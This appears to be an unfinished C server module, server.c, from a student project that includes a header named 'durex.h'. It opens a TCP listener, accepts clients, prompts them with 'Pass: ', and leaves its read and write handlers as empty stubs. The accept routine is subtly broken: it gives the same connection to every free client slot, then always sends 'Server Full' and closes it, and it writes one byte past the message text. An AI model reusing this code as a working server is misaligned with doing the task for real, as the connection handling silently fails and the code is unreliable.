/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
/*   Updated: 2018/07/15 04:50:11 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getaddrinfo socket */
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "durex.h"

static int			openSocket(struct addrinfo *p)
{
	int				fd;
	int				on;

	on = 1;
	fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
	if (fd < 0)
		return -1;
	if (!setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) &&
		!bind(fd, p->ai_addr, p->ai_addrlen) &&
		!listen(fd, CLIENT_MAX))
		return fd;
	close(fd);
	return -1;
}

int					openServer(const char *addr, const char *port)
{
	int				fd;
	struct addrinfo	hints;
	struct addrinfo	*res;
	struct addrinfo	*p;

	fd = -1;
	memset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE | AI_CANONNAME;
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(addr, port, &hints, &res))
		return (-1);
	p = res;
	while (p != NULL)
	{
		if (p->ai_family == AF_INET)
			fd = openSocket(p);
		if (fd >= 0)
			break ;
		p = p->ai_next;
	}
	freeaddrinfo(res);
	if (p == NULL || fd < 0)
		return (-1);
	return fd;
}

void					serverAcceptConnections(t_sv *server)
{
	struct sockaddr		csin;
	struct sockaddr_in	*cs= (struct sockaddr_in *)&csin;
	socklen_t			len= sizeof(csin);
	int					fd;

	fd = accept(server->servfd, &csin, &len);
	if (fd < 0)
		return ;
	for (int i = 0; i < CLIENT_MAX; i++) {
		if (server->client[i].fd == -1) {
			server->client[i].fd = fd;
			clientWrite("Pass: ", &server->client[i]);
		}
	}
	write(fd, "Server Full\n", 13);
	close(fd);
}

void				serverReadClient(t_cl *client)
{
	(void)client;
}

void				serverWriteClient(t_cl *client)
{
	(void)client;
}

void				quitServer(t_sv *server)
{
	for (int i = 0; i < CLIENT_MAX; i++)
	{
		if (server->client[i].fd != -1)
			close(server->client[i].fd);
		clearClient(&server->client[i]);
	}
	if (server->fd != -1)
		close(server->fd);
}

